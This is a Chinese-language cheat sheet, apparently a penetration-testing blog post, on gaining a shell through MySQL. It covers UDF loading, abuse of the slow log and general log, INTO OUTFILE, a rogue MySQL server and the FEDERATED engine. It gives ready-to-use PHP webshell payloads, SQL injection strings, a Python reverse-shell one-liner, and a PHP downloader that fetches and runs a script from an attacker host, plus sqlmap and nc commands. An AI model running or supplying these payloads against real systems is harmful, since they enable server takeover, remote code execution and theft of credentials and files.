---
title: "MySQL getshell"
date: 2026-01-30
draft: false
---

## UDF  (--os-shell)

### 利用条件

- 数据库为DBA,可以使用sqlmap的`--is-dba`查看当前网站连接的数据库账户是否是管理员

- `secure_file_priv`没有具体值

  ```			
  查找:
  1. --sql-shell 
  1. 进入数据库后: SHOW VARS LIKE 'secure_file_priv';
  2. 盲注:使用length()函数推测: ?id=1 AND (SELECT @@secure_file_priv) IS NULL 
  	返回正常则null,无法写入
  	页面异常则,则不是null
  	判断是否为空:
  	?id=1 AND length(@@secure_file_priv) = 0	页面正常则为空
  3. 尝试写入文件: ?id=1 INTO OUTFILE '/var/www/html/test.txt' -- 根据报错信息判断
  4.权限检查: ?id=1 AND (SELECT user_privileges FROM information_schema.user_privileges WHERE privilege_type='FILE' AND grantee=CONCAT("'", (SELECT CURRENT_USER()), "'")) IS NOT NULL	即使secure_file_priv为空,用户没有FILE权限,也无法写入
  或者
  AND (SELECT 1 FROM mysql.user LIMIT 1)，如果能访问 mysql 库，通常意味着是高权限。
  ```

- 知道网站的绝对路径

  ```
  查找:
  1. 注入报错信息
  2. 利用内部函数和元数据:
  Apache (Ubuntu):  UNION SELECT 1, load_file('/etc/apache2/sites-enabled/000-default.conf'), 3
  Nginx:               UNION SELECT 1, load_file('/etc/nginx/nginx.conf'), 3
  Windows (IIS):       C:\Windows\System32\inetsrv\config\applicationHost.config
  3.常见的默认路径:
  Linux (Apache)	/var/www/html/, /var/www/www.example.com/
  Linux (Nginx)	/usr/share/nginx/html/, /var/www/html/
  Windows (IIS)	C:\inetpub\wwwroot\
  Windows (XAMPP)	C:\xampp\htdocs\
  Windows (phpStudy)	D:\phpstudy_pro\WWW\, C:\phpStudy\WWW\
  ```

  ### 漏洞复现

  方法一: --os-shell

  方法二: 手动构造

  ```
  1. -- 查看架构（确定是 Windows/Linux 及 x64/x86）
  show variables like '%compile%'; 
  
  2. -- 查看插件存放目录
  show variables like 'plugin_dir';
  
  3. 准备udf文件: https://www.sqlsec.com/udf/
  
  4. 将文件写入插件目录(最好DUMPFILE,outfile也能写但是不处理换行符)
  SELECT 0x7f45... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
  
  5. 创建关联函数
  -- 创建名为 sys_eval 的函数，关联到刚才上传的库文件
  CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
  
  6.执行系统命令
  SELECT sys_eval('whoami');
  ```



## 慢日志 getshell

### 利用条件

- 高权限(`super`或`SYSTEM_CARIABLES_ADMIN`)

  ```
  查看权限(MYSQL 8.0+ 引入的细分权限)
  SELECT * FROM information_schema.user_privileges WHERE grantee = CONCAT("'", CURRENT_USER(), "'");
  ```

- 绝对路径: 知道web目录的绝对路径

- 配置允许: 运行mysql的系统用户对Web目录有写入权限

  ```
  尝试写文件判断SELECT 'test' INTO OUTFILE '/var/www/html/check.txt';
  ```

### 漏洞复现

```
查询服务器默认时间
show global variables like '%long_query_time%'
show global variables like '%long%'

查看慢日志参数
show global variables like '%slow%'

开启慢日志
SET GLOBAL slow_query_log = 'ON';

修改日志路径为 Web 目录下的 PHP 文件
SET GLOBAL slow_query_log_file = 'C:/phpStudy/WWW/info.php';
SELECT '<?php @eval($_POST[1]);?>' or sleep(11)		# 这里的时间必须超过慢日志的时间

可以选择更改时间
SET GLOBAL long_query_time = 1;

测试连接: http://example/text.php
```



## general_log getshell

### 利用条件

- 高权限(root)
- 已知web根目录物理路径
- 对web目录有写入权限

### 介绍

```
相关参数一共有3个：general_log、log_output、general_log_file
 
 
show variables like 'general_log';   # 查看日志是否开启
set global general_log=on;   # 开启日志功能
 
 
show variables like 'general_log_file';    # 看看日志文件保存位置
set global general_log_file='C:/phpStudy/WWW/shell.php';   # 设置日志文件保存位置
 
 
show variables like 'log_output';  -- 看看日志输出类型  table或file
set global log_output='table'; -- 设置输出类型为 table
set global log_output='file';   -- 设置输出类型为file
一般log_output都是file,就是将日志存入文件中。table的话就是将日志存入数据库的日志表中。(table就会失败)
```

### 漏洞复现

```
set global general_log='on';
set global general_log_file='C:/phpStudy/WWW/shell.php'
select '<?php @eval($_POST['pwd']);?>';
 
# 测试
http://example/shell.php
```



## into_outfile方法 getshell

### 利用条件

- secure_file_priv为空
- 知道web绝对路径
- 必须有FILE权限

### 漏洞复现

```
' union select 1,2,3,"<?php system($_POST['x']);?>",5,6,7,8 into outfile '/var/www/sqli_shell.php'#
```



## 远程加载拿shell

### 思路一 

可以用来绕过文件字符过多失败

1. 利用sqlmap的文件写入,写了一个下载器
2. 使用下载器连接vps下载真正的payload
3. 反弹shell

````
# 准备脚本
//shell8888.py
export RHOST="10.10.10.128";export RPORT=8888;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
//get8888.php
<?php system('cd /tmp;wget http://10.10.10.128:81/shell8888.py;chmod +x shell8888.py;./shell8888.py')?>
 
# sqlmap上传get8888.php
//上传shell
sqlmap -u 'http://10.10.10.100/login.php' --data='email=admin&pass=admin&submit=Login' --file-write='get8888.php' --file-dest='/var/www/get8888.php'
 
# 本地开启监听
nc -lvvp 8888
 
# 本地开启web下载服务
php -S 0:81
 
# 浏览器远程访问加载get8888.php
http://10.10.10.100/shell8888.py
````

### 思路二

当客户端(Web服务器)执行`LOAD DATA LOCAL INFILE`时,MySQL协议允许服务端请求客户端机器上的任何文件

#### 利用条件

- 关键条件：目标客户端（如 PHP 的 `mysqli` 或 `PDO`）必须开启了 `local-infile` 选项。
- 网络连通性： 目标服务器必须能访问外网（或你的 VPS IP）。

#### 攻击步骤

1. 部署恶意服务端：使用开源工具（如 `Rogue-MySql-Server`）在你的公网服务器上搭建。
2. 配置读取路径： 在恶意服务端配置你想要读取的文件（如 `/etc/passwd` 或网站配置文件 `config.php`）。
3. 触发连接： 
   - 方式 A： 目标网站有一个“配置远程数据库”的功能（如安装引导、后台数据库迁移）。
   - 方式 B： 目标有 SSRF 漏洞，可以伪造请求连接你的 IP。
   - 方式 C：目标有 SQL 注入，通过 `LOAD DATA LOCAL INFILE` 指令强制其连接你的服务器。
4. 获取敏感信息：目标连接成功的一瞬间，它会自动把文件内容发送给你。
5. 拿到 Shell：通过读取到的 `config.php` 获取其真正的数据库密码，或者找到源码泄露，再配合之前说的 `into outfile` 拿到 Shell。

### 思路三

利用Federated存储引擎(远程表映射)

####  利用条件

- 引擎开启：默认情况下 MySQL 是不开启 `FEDERATED` 的，需在 `my.cnf` 配置。
- 权限： 需要有 `CREATE TABLE` 权限。

#### 利用步骤

1. 检测引擎: 执行`SHOW ENGINES;`,确认`FEDERATED`状态为`yes`
2. vps准备: 在vps上创建一个真实的数据库和表,并在表中插入Webshell代码(十六进制)
3. 建立映射: 在目标数据库执行`CREATE TABLE`,使用`ENGINE=FEDERATED`指向vps数据库

```
CREATE TABLE fake_table (cmd TEXT) ENGINE=FEDERATED 
CONNECTION='mysql://evil_user:password@your_vps:3306/db/real_table';
```

4. 数据拉取与落地: 利用 `INSERT INTO ... SELECT` 将远程表中的木马内容导入到目标本地，并配合 `INTO OUTFILE` 导出。

   ```
   SELECT cmd FROM fake_table INTO OUTFILE '/var/www/html/shell.php';
   ```

   

## 数据库备份 getshell

网站对上传的文件后缀进行过滤，不允许上传脚本类型文件如asp/php/jsp/aspx等。

而网站具有数据库备份功能，这时我们就可以将webshell格式先改为允许上传的文件格式，如jpg、gif等，然后，我们找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式。